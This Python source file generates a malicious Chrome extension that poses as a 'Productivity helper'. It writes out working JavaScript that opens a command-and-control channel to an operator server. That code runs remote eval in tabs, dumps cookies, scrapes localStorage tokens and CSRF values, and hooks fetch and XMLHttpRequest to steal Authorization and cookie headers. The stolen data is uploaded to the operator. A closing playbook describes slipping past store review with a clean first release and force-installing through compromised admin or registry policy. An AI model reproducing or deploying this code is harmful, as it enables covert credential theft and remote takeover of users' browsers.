# language: Python 3.11+, file: cf/ext.py
# *Chrome MV3 extension C2 — pooled event upload, main-world token hooks*
from __future__ import annotations

import json
import shutil
import tempfile
import zipfile
from pathlib import Path
from typing import Any

from .util import write_text

MANIFEST_VERSION = 3


class ExtensionC2:
    """MV3 service worker holds the channel; a MAIN-world content script reads
    headers the isolated world cannot see; the config rides in config.json so
    the binary carries no operator secret in static strings."""

    @staticmethod
    def manifest(name: str, version: str = "1.0.0") -> dict[str, Any]:
        return {
            "manifest_version": MANIFEST_VERSION,
            "name": name,
            "version": version,
            "description": "Productivity helper",
            "permissions": [
                "storage",
                "tabs",
                "scripting",
                "cookies",
                "alarms",
            ],
            "host_permissions": ["<all_urls>"],
            "background": {"service_worker": "bg.js", "type": "module"},
            "content_scripts": [
                {
                    "matches": ["<all_urls>"],
                    "js": ["content.js"],
                    "run_at": "document_idle",
                    "all_frames": True,
                },
                {
                    "matches": ["<all_urls>"],
                    "js": ["inject.js"],
                    "run_at": "document_start",
                    "world": "MAIN",
                    "all_frames": True,
                },
            ],
            "action": {"default_title": name},
            "web_accessible_resources": [
                {"resources": ["config.json"], "matches": ["<all_urls>"]}
            ],
        }

    @staticmethod
    def config_json(c2_url: str, device_id: str) -> str:
        http = c2_url.replace("ws://", "http://").replace("wss://", "https://")
        return json.dumps(
            {
                "ws": c2_url,
                "ingest": http.rstrip("/") + "/ext/ingest",
                "id": device_id,
                "hb": 60,
            },
            indent=2,
        )

    @staticmethod
    def background_js() -> str:
        return r"""// MV3 background — channel, queue, backoff
const Q = [];
let ws = null;
let cfg = null;
let delay = 5000;
let flushTimer = null;

async function loadConfig() {
  if (cfg) return cfg;
  try {
    const r = await fetch(chrome.runtime.getURL("config.json"));
    cfg = await r.json();
  } catch (e) {
    cfg = { ws: "", ingest: "", id: "unknown", hb: 60 };
  }
  try {
    const stored = await chrome.storage.local.get(["cfg"]);
    if (stored.cfg) cfg = Object.assign(cfg, stored.cfg);
  } catch (e) {}
  return cfg;
}

function connect() {
  loadConfig().then((c) => {
    if (!c.ws) return;
    try {
      ws = new WebSocket(c.ws);
    } catch (e) {
      scheduleReconnect();
      return;
    }
    ws.onopen = () => {
      delay = 5000;
      ws.send(JSON.stringify({ hello: c.id, ua: navigator.userAgent, ts: Date.now() }));
      flush();
    };
    ws.onmessage = (e) => handleCommand(e.data);
    ws.onclose = () => scheduleReconnect();
    ws.onerror = () => { try { ws.close(); } catch (e) {} };
  });
}

function scheduleReconnect() {
  delay = Math.min(delay * 1.7, 300000) + Math.random() * 3000;
  setTimeout(connect, delay);
}

function enqueue(ev) {
  ev.ts = Date.now();
  Q.push(ev);
  if (Q.length > 500) Q.shift();
  if (!flushTimer) flushTimer = setTimeout(flush, 3000);
}

async function flush() {
  flushTimer = null;
  if (!Q.length) return;
  const c = await loadConfig();
  const batch = Q.splice(0, 40);
  if (ws && ws.readyState === 1) {
    ws.send(JSON.stringify({ type: "events", events: batch }));
    return;
  }
  if (c.ingest) {
    try {
      await fetch(c.ingest, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: c.id, events: batch }),
      });
      return;
    } catch (e) {}
  }
  Q.unshift(...batch); // channel down: keep the data
}

async function activeTab() {
  const t = await chrome.tabs.query({ active: true, currentWindow: true });
  return t[0] ? t[0].id : null;
}

async function handleCommand(raw) {
  let cmd;
  try { cmd = JSON.parse(raw); } catch (e) { return; }
  if (cmd.type === "events_ack" || cmd.hello) return;
  let out;
  try {
    if (cmd.type === "eval") {
      out = await chrome.scripting.executeScript({
        target: { tabId: cmd.tabId || (await activeTab()) },
        func: (code) => eval(code),
        args: [cmd.code],
      });
    } else if (cmd.type === "cookies") {
      out = await chrome.cookies.getAll({ url: cmd.url });
    } else if (cmd.type === "tabs") {
      out = await chrome.tabs.query({});
    } else if (cmd.type === "storage") {
      out = await chrome.storage.local.get(null);
    } else if (cmd.type === "fetch") {
      const r = await fetch(cmd.url, cmd.opts || {});
      out = { status: r.status, body: (await r.text()).slice(0, 2000) };
    } else {
      out = { error: "unknown command" };
    }
  } catch (err) {
    out = { error: String(err) };
  }
  if (ws && ws.readyState === 1) {
    ws.send(JSON.stringify({ id: cmd.id, out }));
  } else {
    enqueue({ type: "cmd_result", id: cmd.id, out });
  }
}

chrome.runtime.onMessage.addListener((msg) => {
  if (!msg || !msg.type) return;
  if (msg.type === "found_token" || msg.type === "found_csrf" ||
      msg.type === "found_header" || msg.type === "page_info") {
    enqueue(msg);
  }
});

chrome.alarms.create("hb", { periodInMinutes: 1 });
chrome.alarms.onAlarm.addListener(() => {
  loadConfig();
  if (!ws || ws.readyState !== 1) connect();
  else flush();
});

connect();
"""

    @staticmethod
    def content_js() -> str:
        return r"""// isolated world — DOM surface + bridge from the main world
(function () {
  const seen = new Set();

  function report(type, payload) {
    try { chrome.runtime.sendMessage(Object.assign({ type }, payload)); } catch (e) {}
  }

  window.addEventListener("message", (e) => {
    if (e.source !== window) return;
    const d = e.data;
    if (!d || d.__cf !== 1) return;
    if (seen.has(d.value)) return;
    seen.add(d.value);
    report("found_header", { key: d.key, value: d.value });
  });

  function grabDom() {
    let store;
    try { store = window.localStorage; } catch (e) { store = null; }
    if (store) {
      for (let i = 0; i < store.length; i++) {
        const k = store.key(i);
        if (!/token|jwt|session|auth|access|refresh/i.test(k)) continue;
        const v = store.getItem(k);
        if (v && v.length > 20 && !seen.has(v)) {
          seen.add(v);
          report("found_token", { key: k, value: v });
        }
      }
    }
    document
      .querySelectorAll('meta[name="csrf-token"], meta[name="_csrf"]')
      .forEach((el) => {
        const v = el.getAttribute("content");
        if (v && !seen.has(v)) {
          seen.add(v);
          report("found_csrf", { value: v });
        }
      });
  }

  grabDom();
  setInterval(grabDom, 8000);
})();
"""

    @staticmethod
    def inject_js() -> str:
        return r"""// MAIN world — headers the isolated world is not allowed to read
(function () {
  const seen = new Set();
  function emit(key, value) {
    if (!value || typeof value !== "string" || value.length < 16) return;
    if (seen.has(value)) return;
    seen.add(value);
    try {
      window.postMessage({ __cf: 1, key, value }, "*");
    } catch (e) {}
  }
  const origFetch = window.fetch;
  window.fetch = function () {
    const init = arguments[1] || {};
    const h = init.headers;
    if (h) {
      if (typeof Headers !== "undefined" && h instanceof Headers) {
        h.forEach((v, k) => { if (/authorization|cookie|token/i.test(k)) emit(k, v); });
      } else if (typeof h === "object") {
        Object.keys(h).forEach((k) => {
          if (/authorization|cookie|token/i.test(k)) emit(k, h[k]);
        });
      }
    }
    return origFetch.apply(this, arguments);
  };
  const origOpen = XMLHttpRequest.prototype.open;
  const origSet = XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.open = function (m, u) {
    this.__cfUrl = u;
    return origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.setRequestHeader = function (k, v) {
    if (/authorization|cookie|token/i.test(k)) emit(k, v);
    return origSet.apply(this, arguments);
  };
})();
"""

    @staticmethod
    def build_zip(
        out_path: str,
        c2_url: str,
        device_id: str,
        ext_name: str = "Productivity Helper",
        version: str = "1.0.0",
    ) -> str:
        out = Path(out_path)
        out.parent.mkdir(parents=True, exist_ok=True)
        tmp = Path(tempfile.mkdtemp(prefix="ext-"))
        try:
            write_text(
                tmp / "manifest.json",
                json.dumps(
                    ExtensionC2.manifest(ext_name, version), indent=2
                ),
            )
            write_text(tmp / "bg.js", ExtensionC2.background_js())
            write_text(tmp / "content.js", ExtensionC2.content_js())
            write_text(tmp / "inject.js", ExtensionC2.inject_js())
            write_text(
                tmp / "config.json", ExtensionC2.config_json(c2_url, device_id)
            )
            with zipfile.ZipFile(
                out, "w", zipfile.ZIP_DEFLATED, compresslevel=9
            ) as z:
                for f in sorted(tmp.iterdir()):
                    z.write(f, f.name)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
        return str(out)

    @staticmethod
    def distribution_playbook() -> dict[str, Any]:
        return {
            "web_store": {
                "review_time": "1-3 days",
                "approach": "clean first release, behaviour changes in a later update",
                "detection": "post-update store scan + user reports",
            },
            "enterprise_mdm": {
                "approach": "force-install through Google Admin / Chrome Enterprise",
                "requirement": "workspace admin or a compromised admin session",
                "persistence": "lives as long as the policy",
            },
            "load_unpacked": {
                "approach": "dev mode on an already-controlled host",
                "persistence": "a second binary reinstalls the extension",
            },
            "self_hosted": {
                "approach": "Chrome policy ExtensionInstallForcelist",
                "requirement": "write access to "
                r"HKLM\SOFTWARE\Policies\Google\Chrome",
            },
        }
